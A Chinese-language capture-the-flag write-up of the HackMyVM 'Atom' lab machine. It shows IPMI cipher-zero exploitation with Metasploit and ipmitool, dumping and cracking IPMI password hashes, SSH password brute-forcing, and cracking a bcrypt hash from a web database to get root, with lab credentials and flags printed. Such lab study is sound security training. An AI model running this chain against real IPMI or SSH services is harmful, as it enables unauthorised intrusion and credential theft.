---
{"dg-publish":true,"title":"hackmyvm_atom","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_atom.md","permalink":"/安全/靶机/hackmyvm_atom/","dgPassFrontmatter":true}
---

# 主机发现


![Pasted image 20250206121219.png](/img/user/picture/Pasted%20image%2020250206121219.png)
就开了一个22端口

![Pasted image 20250206121449.png](/img/user/picture/Pasted%20image%2020250206121449.png)


好像没什么信息，看一下UDP

![Pasted image 20250206122618.png](/img/user/picture/Pasted%20image%2020250206122618.png)


https://hacktricks.xsx.tw/network-services-pentesting/623-udp-ipmi
先看一下版本
```sh
nmap -sU --script ipmi-version -p 623 <ip>
```
![Pasted image 20250206123002.png](/img/user/picture/Pasted%20image%2020250206123002.png)

看一下漏洞是否可以利用
```sh
[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/ipmi/ipmi_cipher_zero
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_cipher_zero) >> show options

Module options (auxiliary/scanner/ipmi/ipmi_cipher_zero):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to probe in each set
   RHOSTS                      yes       The target host(s), see https://docs.metasploi
                                         t.com/docs/using-metasploit/basics/using-metas
                                         ploit.html
   RPORT      623              yes       The target port (UDP)
   THREADS    10               yes       The number of concurrent threads


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_cipher_zero) >> set RHOST 192.168.124.26
RHOST => 192.168.124.26
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_cipher_zero) >> run
[*] Sending IPMI requests to 192.168.124.26->192.168.124.26 (1 hosts)
[+] 192.168.124.26:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```sh
ipmitool -I lanplus -C 0 -H <ip> -U root -P root user list # Lists users
```
但是我们缺少可用的用户名密码

![Pasted image 20250206154425.png](/img/user/picture/Pasted%20image%2020250206154425.png)

```sh
[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run
[+] 192.168.124.26:623 - IPMI - Hash found: admin:aae37ebd0212000032e2efc20addb57706955f8825ba6f4e2404b94bd04531ebb1045fd6a7081d27a123456789abcdefa123456789abcdef140561646d696e:f656e20c1ef210c796ec7f68a47d78077b3b3c33
[+] 192.168.124.26:623 - IPMI - Hash for user 'admin' matches password 'cukorborso'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

现在就有了用户名密码
```
admin cukorborso
```


```sh
ipmitool -I lanplus -C 0 -H 192.168.124.26 -U admin -P cukorborso user list 
```

![Pasted image 20250206154645.png](/img/user/picture/Pasted%20image%2020250206154645.png)

简单处理一下，形成用户字典

```sh
cat user_raw.txt | awk   '{print $2}' | grep -v "true" |  grep -v "Name" | tee -a user.txt
```


之后再根据这些用户名爆破出密码，在分别进行ssh登录，发现
`onida/jiggaman`
成功登录

![Pasted image 20250206165739.png](/img/user/picture/Pasted%20image%2020250206165739.png)

```txt
f75390001fa2fe806b4e3f1e5dadeb2b
```

# 提权

//自己做也是没什么思路，看了大佬wp发现服务器上有web目录

```sh
onida@atom:/var/www/html$ ls
atom-2400-database.db  img        js         profile.php   video
css                    index.php  login.php  register.php
onida@atom:/var/www/html$ strings atom-2400-database.db
SQLite format 3
mtableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
indexsqlite_autoindex_users_1users
tablelogin_attemptslogin_attempts
CREATE TABLE login_attempts (
    id INTEGER PRIMARY KEY,
    ip_address TEXT NOT NULL,
    attempt_time INTEGER NOT NULL
atom$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm
        atom

```

哈希密码就在后面
```sh
┌──(root㉿kali)-[~/workspqce/pentest/atom]
└─# cat hash
$2y$10$Z1K.4yVakZEY.Qsju3WZzukW/M3fI6BkSohYOiBQqG7pK1F2fH9Cm

┌──(root㉿kali)-[~/workspqce/pentest/atom]
└─# john hash
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
madison          (?)
1g 0:00:00:03 DONE 2/3 (2025-02-06 04:09) 0.2732g/s 59.01p/s 59.01c/s 59.01C/s goodluck..stephen
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```


```sh
onida@atom:/var/www/html$ su -
Password:
root@atom:~# id
uid=0(root) gid=0(root) groups=0(root)
root@atom:~# cd /root
root@atom:~# ls
root.txt
root@atom:~# cat root.txt
d3a4fd660f1af5a7e3c2f17314f4a962
```






# 总结

别忘了UDP扫描










